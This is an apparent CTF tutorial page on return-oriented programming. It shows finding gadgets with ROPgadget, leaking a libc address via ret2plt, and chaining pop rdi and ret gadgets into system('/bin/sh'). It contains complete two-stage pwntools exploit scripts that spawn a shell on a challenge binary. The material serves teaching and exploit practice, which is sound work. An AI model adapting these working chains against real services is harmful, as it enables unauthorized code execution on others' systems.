@@ -1,0 +1,271 @@
+---
+title: "ROP Chain CTF Writeup: Bypassing NX with Gadgets"
+sidebarTitle: "ROP Chains"
+description: "Return-oriented programming CTF walkthrough: find gadgets with ROPgadget, chain them to call system(), and bypass NX/DEP protections with pwntools."
+---
+
+When a binary has NX (No-Execute) enabled, the CPU will raise a fault the moment execution reaches any non-executable region — your shellcode sitting on the stack is dead before it runs a single instruction. Return-Oriented Programming sidesteps this completely by never injecting new code at all. Instead, you chain together small sequences of existing instructions — called **gadgets** — that already live in executable memory. Each gadget ends in a `ret`, which pops the next address off the stack and hands control to the next gadget. String enough gadgets together and you can perform arbitrary computation using only code the binary already contains.
+
+## What Is a Gadget?
+
+A gadget is a short instruction sequence ending in `ret`. The canonical examples look like:
+
+```
+pop rdi ; ret
+pop rsi ; pop r15 ; ret
+mov [rax], rbx ; ret
+```
+
+When you control the stack, you control what `ret` pops into the instruction pointer. By placing gadget addresses and their argument values in sequence on the stack, you construct a program out of borrowed pieces. The technique is called Return-Oriented Programming because every "instruction" in your program is a return from some borrowed snippet.
+
+## When You Need ROP
+
+<Note>
+You reach for ROP whenever `checksec` shows **NX enabled** and you cannot simply jump to shellcode. On modern CTF binaries, NX is almost always on. Even on old 32-bit challenges, practicing ROP now pays dividends when you face heap exploits and kernel challenges later.
+</Note>
+
+The minimum viable ROP chain for a CTF is a call to `system("/bin/sh")`. To make that happen on x86-64 you need three things:
+
+1. The runtime address of `system` in libc (requires defeating ASLR first).
+2. The address of the string `/bin/sh` in libc.
+3. A `pop rdi; ret` gadget to load the `/bin/sh` pointer into the first argument register before calling `system`.
+
+## Step 1 — Find Gadgets with ROPgadget
+
+`ROPgadget` statically scans a binary for every usable gadget and prints its address and bytes. Run it against your challenge binary:
+
+```bash
+ROPgadget --binary challenge --rop --only 'pop|ret'
+ROPgadget --binary challenge --string '/bin/sh'
+```
+
+Sample output for the `pop|ret` filter:
+
+```
+Gadgets information
+============================================================
+0x000000000040119e : pop rdi ; ret
+0x00000000004011a0 : pop rsi ; pop r15 ; ret
+0x000000000040101a : ret
+```
+
+If the binary is PIE, these addresses are offsets from the binary base — you need to add the leaked base before using them. If PIE is disabled, these addresses are absolute and fixed across every run.
+
+<Tip>
+Always search for a bare `ret` gadget (just `0xc3`). You will need it for 16-byte stack alignment on x86-64 — explained below.
+</Tip>
+
+## Step 2 — Understand Stack Alignment
+
+<Note>
+The x86-64 System V ABI requires the stack pointer to be **16-byte aligned** at the point of a `call` instruction. Many libc functions (including `system`) use SSE instructions internally that will segfault on a misaligned stack. If your exploit crashes inside `system` rather than giving you a shell, insert a bare `ret` gadget immediately before the `system` call to consume one 8-byte slot and restore alignment.
+</Note>
+
+```
+stack before system() call — misaligned (8-byte aligned):
+rsp → [ pop rdi addr ]
+      [ /bin/sh addr ]
+      [ system addr  ]
+
+fix: insert a ret gadget:
+rsp → [ ret gadget   ]   ← burns one slot, restores 16-byte alignment
+      [ pop rdi addr ]
+      [ /bin/sh addr ]
+      [ system addr  ]
+```
+
+## Step 3 — Leak a libc Address (ret2plt)
+
+ASLR randomizes libc's base address on every run. Before you can call `system`, you need to know where libc actually landed. The standard technique is **ret2plt**: call a PLT stub (like `puts@plt`) with a GOT address as its argument. The GOT entry holds the resolved runtime address of that function in libc. Printing it gives you a fixed point from which you can compute libc base.
+
+<Steps>
+  <Step title="Identify a suitable leak function">
+    You need a function that both prints data and is already in the PLT. `puts` is ideal — it takes a single pointer in `rdi` and prints until a null byte. `printf` and `write` work too.
+
+    ```bash
+    objdump -d challenge | grep '@plt'
+    # or in pwntools:
+    # binary.plt.keys()
+    ```
+  </Step>
+
+  <Step title="Build the leak payload">
+    Call `puts(puts@got)` to print the runtime address of `puts` in libc, then return to `main` to get a second input window.
+
+    ```python
+    from pwn import *
+
+    binary = ELF('./challenge')
+    p = process('./challenge')
+
+    rop = ROP(binary)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+
+    payload = flat(
+        b'A' * 72,
+        pop_rdi,
+        binary.got['puts'],
+        binary.plt['puts'],
+        binary.symbols['main']
+    )
+    p.sendline(payload)
+    ```
+  </Step>
+
+  <Step title="Parse the leak and compute libc base">
+    ```python
+    libc = ELF('./libc.so.6')   # use the exact libc from the challenge
+
+    p.recvuntil(b'\n')          # skip any banner or prompt
+    leaked    = u64(p.recvline().strip().ljust(8, b'\x00'))
+    libc_base = leaked - libc.symbols['puts']
+    log.success(f'puts @ {hex(leaked)}')
+    log.success(f'libc base @ {hex(libc_base)}')
+    ```
+
+    `ljust(8, b'\x00')` pads shorter outputs to 8 bytes before unpacking — `puts` stops at null bytes, so the printed address is often shorter than 8 bytes.
+  </Step>
+</Steps>
+
+## Step 4 — Call system("/bin/sh")
+
+With `libc_base` known, compute the absolute runtime addresses of `system` and `/bin/sh`, build the second payload, and send it.
+
+<Steps>
+  <Step title="Compute target addresses">
+    ```python
+    system = libc_base + libc.symbols['system']
+    binsh  = libc_base + next(libc.search(b'/bin/sh'))
+    log.info(f'system @ {hex(system)}')
+    log.info(f'/bin/sh @ {hex(binsh)}')
+    ```
+  </Step>
+
+  <Step title="Build and send the shell payload">
+    ```python
+    rop2 = ROP(binary)
+    ret_gadget = rop2.find_gadget(['ret'])[0]
+
+    payload2 = flat(
+        b'A' * 72,
+        ret_gadget,   # stack alignment (see note above)
+        pop_rdi,
+        binsh,
+        system
+    )
+    p.sendline(payload2)
+    p.interactive()
+    ```
+  </Step>
+</Steps>
+
+## Complete Exploit
+
+Here is the full two-stage exploit assembled from all the pieces above:
+
+```python
+from pwn import *
+
+binary = ELF('./challenge')
+libc   = ELF('./libc.so.6')
+p      = process('./challenge')
+
+rop = ROP(binary)
+pop_rdi    = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadget = rop.find_gadget(['ret'])[0]
+
+# ── Stage 1: leak puts GOT to defeat ASLR ────────────────────
+payload = flat(
+    b'A' * 72,
+    pop_rdi, binary.got['puts'],
+    binary.plt['puts'],
+    binary.symbols['main']
+)
+p.sendline(payload)
+leaked    = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc_base = leaked - libc.symbols['puts']
+
+# ── Stage 2: system('/bin/sh') ────────────────────────────────
+binsh  = libc_base + next(libc.search(b'/bin/sh'))
+system = libc_base + libc.symbols['system']
+
+payload2 = flat(
+    b'A' * 72,
+    ret_gadget,  # stack alignment
+    pop_rdi, binsh,
+    system
+)
+p.sendline(payload2)
+p.interactive()
+```
+
+## Using the pwntools ROP Class
+
+The pwntools `ROP` class can build chains automatically when the gadgets it needs are present in the binary or a loaded library. This is faster for standard call sequences:
+
+```python
+from pwn import *
+
+binary = ELF('./challenge')
+libc   = ELF('./libc.so.6')
+p      = process('./challenge')
+
+# Stage 1 — let pwntools build the leak chain
+rop1 = ROP(binary)
+rop1.puts(binary.got['puts'])
+rop1.call(binary.symbols['main'])
+
+p.sendline(b'A' * 72 + rop1.chain())
+leaked    = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leaked - libc.symbols['puts']   # set libc base
+
+# Stage 2 — pwntools resolves system and /bin/sh from updated libc
+rop2 = ROP([binary, libc])
+rop2.system(next(libc.search(b'/bin/sh')))
+
+p.sendline(b'A' * 72 + rop2.chain())
+p.interactive()
+```
+
+Setting `libc.address` tells pwntools the base, so all subsequent symbol lookups return absolute runtime addresses automatically.
+
+## ROPgadget Quick Reference
+
+```bash
+# All gadgets ending in ret
+ROPgadget --binary challenge --rop
+
+# Filter to specific instructions
+ROPgadget --binary challenge --rop --only 'pop|ret'
+
+# Search for a specific string (useful for /bin/sh in libc)
+ROPgadget --binary challenge --string '/bin/sh'
+
+# Dump the binary's ROP chain suggestion (experimental)
+ROPgadget --binary challenge --chain 'execve'
+
+# Search a shared library
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only 'pop rdi|ret'
+```
+
+<Warning>
+If you're working against a remote server, always use the exact `libc.so.6` provided with the challenge (check the challenge files or Dockerfile). Using your local libc to compute offsets will produce wrong addresses and a crash instead of a shell. When no libc is provided, tools like `libc-database` or `pwntools`'s `LibcSearcher` can identify the version from the leaked address's last three nibbles.
+</Warning>
+
+## Troubleshooting Common Failures
+
+<Accordion title="Exploit crashes inside system() — not before it">
+  Almost always a stack alignment issue. Add a bare `ret` gadget immediately before the `system` address in your payload. On x86-64, `rsp` must be 16-byte aligned at the moment `system` is entered.
+</Accordion>
+
+<Accordion title="Leaked address looks wrong (too short or null bytes cut it off)">
+  `puts` stops printing at a null byte. If the leaked address contains a null byte in the middle (common when ASLR isn't fully randomizing), use `write(1, got_addr, 8)` instead of `puts` — it prints exactly 8 bytes regardless of content.
+</Accordion>
+
+<Accordion title="Gadget not found in binary — ROPgadget returns nothing">
+  The binary may be very small. Search inside libc instead: `ROPgadget --binary libc.so.6 --only 'pop rdi|ret'`. If you set `libc.address` before building your `ROP([binary, libc])` object, pwntools will find gadgets in libc as well.
+</Accordion>
+
+<Accordion title="Offset of 72 bytes doesn't work for my binary">
+  The offset depends on the specific buffer size and stack layout of your binary. Re-run the cyclic pattern technique from the Buffer Overflow writeup to measure your exact offset. Never assume an offset from another writeup applies to your binary.
+</Accordion>
